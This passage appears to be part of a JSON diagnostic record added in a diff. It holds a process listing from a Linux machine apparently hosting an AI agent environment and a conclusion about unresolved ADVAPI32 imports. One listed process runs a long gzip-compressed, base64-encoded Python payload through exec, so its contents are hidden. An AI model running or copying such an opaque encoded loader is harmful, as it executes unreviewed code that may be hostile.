/usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f\n   2027 /usr/libexec/at-spi-bus-launcher\n   2040 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 12 --address=unix:path=/run/user/1000/at-spi/bus_0\n   2074 /usr/bin/gnome-keyring-daemon --foreground --components=pkcs11,secrets --control-directory=/run/user/1000/keyring\n   2253 /usr/libexec/upowerd\n   2256 /usr/libexec/dconf-service\n   2282 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups\n   2335 /usr/libexec/colord\n   2731 /usr/sbin/uuidd --socket-activation\n   2787 /usr/libexec/bluetooth/obexd\n   2912 /usr/libexec/gvfs-udisks2-volume-monitor\n   2918 [kworker/R-tls-strp]\n   2926 /usr/libexec/gvfs-gphoto2-volume-monitor\n   2932 /usr/libexec/gvfs-afc-volume-monitor\n   2983 /usr/libexec/gvfs-goa-volume-monitor\n   2999 /usr/libexec/goa-daemon\n   3032 /usr/libexec/goa-identity-service\n   3068 /usr/libexec/gvfs-mtp-volume-monitor\n   3100 /usr/libexec/evolution-source-registry\n   3110 /usr/libexec/gvfsd-trash --spawner :1.12 /org/gtk/gvfs/exec_spaw/0\n   3133 /usr/libexec/gvfsd-metadata\n   3145 /usr/libexec/evolution-calendar-factory\n   3155 /usr/libexec/evolution-addressbook-factory\n   3374 [kworker/R-wg-crypt-wg0]\n   3380 [napi/wg0-0]\n  10995 /usr/lib/systemd/systemd-resolved\n  11902 /usr/bin/pulseaudio -n --daemonize=no --exit-idle-time=-1 --log-target=journal --file=/etc/pulse/ascii-streaming-audio.pa\n  12533 /usr/libexec/xdg-desktop-portal\n  12541 /usr/libexec/xdg-document-portal\n  12545 /usr/libexec/xdg-permission-store\n  12553 fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/1000/doc\n  13507 /usr/bin/socat TCP6-LISTEN:8911,fork,reuseaddr,ipv6only=1 TCP4:127.0.0.1:8911\n  13728 /usr/local/bin/ariana-fswatch\n  14545 /opt/ascii-agent/ascii-agents-server\n  14600 sudo -n /usr/local/bin/ascii-proclog\n  14605 /usr/local/bin/ascii-proclog\n  15229 /usr/local/bin/ariana-fswatch\n  15903 [psimon]\n  15909 /usr/local/bin/ariana-fswatch\n  18547 /var/lib/ascii-lazy-bin/ascii-lazyfs --config /var/lib/ascii-lazy/config.json\n  18855 /usr/sbin/lightdm\n  18865 /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch\n  18873 lightdm --session-child 13 16\n  18879 dbus-run-session -- /usr/local/bin/ascii-desktop --session\n  18997 /usr/bin/ibus-daemon --daemonize --xim\n  18998 dbus-daemon --nofork --print-address 4 --session\n  18999 /usr/local/bin/ascii-desktop --session\n  19004 /usr/libexec/ibus-memconf\n  19005 /usr/libexec/ibus-ui-gtk3\n  19006 /usr/bin/openbox --sm-disable --config-file /usr/local/share/ascii-desktop/openbox.xml\n  19007 /usr/libexec/ibus-extension-gtk3\n  19011 /usr/libexec/ibus-x11 --kill-daemon\n  19015 /usr/libexec/ibus-portal\n  19040 /usr/libexec/at-spi2-registryd --use-gnome-session\n  19048 /usr/libexec/ibus-engine-simple\n  19071 /usr/bin/sunshine\n  19170 dbus-launch --autolaunch 29ac09d4b05641eb8d6da3956780c691 --binary-syntax --close-stderr\n  19171 /usr/bin/dbus-daemon --syslog-only --fork --print-pid 5 --print-address 7 --session\n  19173 /usr/libexec/at-spi-bus-launcher\n  19179 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 12 --address=unix:path=/run/ascii-streaming-audio/at-spi/bus_0\n  19183 /usr/libexec/at-spi2-registryd --use-gnome-session\n  19204 /opt/ascii/cua-driver/cua-driver serve --socket /run/ascii-cua/driver.sock --permission-mode standard --grant existing-profile --no-overlay\n  19230 /opt/moonlight-web/web-server --config-path /opt/moonlight-web/server/config.json\n  20146 [kworker/u16:3-events_unbound]\n  20147 [kworker/u16:4-flush-253:0]\n  33092 [kworker/u16:1-flush-253:0]\n  33800 [kworker/u16:2-flush-253:0]\n  36245 /usr/libexec/fwupd/fwupd\n  41128 [kworker/u16:6-ext4-rsv-conversion]\n  41829 [kworker/1:0-events]\n  45422 [kworker/u16:7-flush-253:0]\n  51401 [kworker/3:2-events]\n  52376 [kworker/0:0-cgroup_release]\n  54022 [kworker/2:0-cgroup_release]\n  55848 [kworker/0:2-wg-crypt-wg0]\n  56406 [kworker/1:2-mm_percpu_wq]\n  56670 [kworker/u16:0-flush-253:0]\n  57522 [kworker/2:2-wg-crypt-wg0]\n  57827 [kworker/3:0-cgroup_free]\n  59881 [kworker/1:1-wg-crypt-wg0]\n  60721 [kworker/0:1-events]\n  60759 [kworker/3:1-cgroup_free]\n  61465 [kworker/2:1-cgroup_free]\n  61536 python3 -c import base64,gzip;exec(gzip.decompress(base64.b64decode('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')))\n  61557 ps -eo pid,args\n",
+  "free": 43529027584,
+  "stagingCount": 0,
+  "startupCount": 0,
+  "acceptCount": 0,
+  "conclusion": "OFFLINE_CLOSURE_BLOCKED: two unresolved named ADVAPI32 imports; no native ADVAPI32 in retained runtime/installed/runner/staged binaries. No runtime reachability claim; no overlay or guest launched."
+}
